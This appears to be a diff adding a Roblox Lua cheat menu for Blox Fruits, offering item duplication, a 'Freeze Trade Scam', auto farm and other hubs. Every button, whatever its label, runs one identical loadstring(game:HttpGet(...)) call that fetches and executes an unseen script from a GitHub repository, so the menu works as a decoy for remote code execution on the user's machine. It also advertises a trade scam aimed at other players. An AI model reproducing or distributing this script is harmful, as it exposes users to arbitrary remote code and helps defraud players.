@@ -1,0 +1,106 @@
+-- Garantir que a OrionLib está carregada
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+
+-- Criar a janela do menu com o nome personalizado
+local Window = OrionLib:MakeWindow({Name = "Gamepass Discount Blox Fruits", HidePremium = true, IntroText = "Welcome"})
+
+-- Função para executar o script remoto
+local function executeScript()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/wogjiew55/GamepassDiscount/refs/heads/main/BloxFruits', true))()
+end
+
+-- Main Features Tab
+local MainTab = Window:MakeTab({
+    Name = "Main Features",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+MainTab:AddTextbox({
+    Name = "Enter Dupe Number",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(Value)
+        print("Dupe Number: "..Value)
+    end
+})
+
+MainTab:AddButton({
+    Name = "Start Dupe",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+MainTab:AddButton({
+    Name = "Extra Features",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+MainTab:AddButton({
+    Name = "All in Stock",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+MainTab:AddButton({
+    Name = "Freeze Trade Scam",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+MainTab:AddButton({
+    Name = "Auto Farm",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+-- Other Scripts Tab
+local OtherScriptsTab = Window:MakeTab({
+    Name = "Other Scripts",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+OtherScriptsTab:AddButton({
+    Name = "Hoho Hub",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+OtherScriptsTab:AddButton({
+    Name = "Banana Hub (Keyless)",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+OtherScriptsTab:AddButton({
+    Name = "Redz Hub",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+OtherScriptsTab:AddButton({
+    Name = "Speed Hub",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+OtherScriptsTab:AddButton({
+    Name = "W-Azure",
+    Callback = function()
+        executeScript()  -- Executa o script remoto ao clicar
+    end
+})
+
+-- Inicializa a UI
+OrionLib:Init()
